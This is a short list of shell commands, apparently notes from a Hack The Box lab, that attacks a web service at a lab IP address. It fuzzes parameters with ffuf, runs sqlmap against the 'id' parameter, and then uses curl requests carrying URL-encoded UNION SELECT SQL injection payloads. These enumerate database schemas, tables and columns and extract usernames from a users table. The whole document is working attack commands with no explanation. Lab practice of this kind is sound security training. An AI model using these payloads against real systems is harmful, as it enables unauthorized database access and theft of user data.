```
ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3003/?FUZZ=test_value'
ffuf -w burp-parameter-names.txt -u http://10.129.202.133:3003/?id=FUZZ -fs 38
sqlmap http://10.129.202.133:3003/?id= --risk 2 --level 3
curl http://10.129.202.133:3003/?id=1%20UNION%20ALL%20SELECT%20schema%5Fname%2C5289%2C5289%20from%20information%5Fschema%2Eschemata%2D%2D%20%2D
curl http://10.129.202.133:3003/?id=1%20UNION%20ALL%20SELECT%20table%5Fname%2Ctable%5Fschema%2C5289%20from%20information%5Fschema%2Etables%20where%20table%5Fschema%3D%27htb%27%2D%2D%20%2D
curl http://10.129.202.133:3003/?id=1%20UNION%20ALL%20SELECT%20column%5Fname%2C5289%2C5289%20from%20information%5Fschema%2Ecolumns%20where%20table%5Fname%3D%27users%27%2D%2D%20%2D
curl http://10.129.202.133:3003/?id=1%20UNION%20ALL%20SELECT%20username%2C5289%2C5289%20from%20htb%2Eusers%20where%20position%3D736373%2D%2D%20%2D
```
